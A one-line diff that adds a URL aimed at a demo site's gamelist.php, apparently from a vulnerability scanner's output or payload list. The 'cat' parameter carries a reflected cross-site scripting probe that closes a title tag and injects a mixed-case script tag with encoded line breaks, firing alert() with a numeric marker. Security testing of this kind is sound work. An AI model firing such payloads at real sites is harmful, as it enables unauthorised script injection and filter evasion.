@@ -1,0 +1,1 @@
+http://www.example.com/demo/gamelist.php?cat=1&lt;/title&gt;&lt;ScRiPt%20%0a%0d&gt;alert(405750665179)%3B&lt;/ScRiPt&gt;
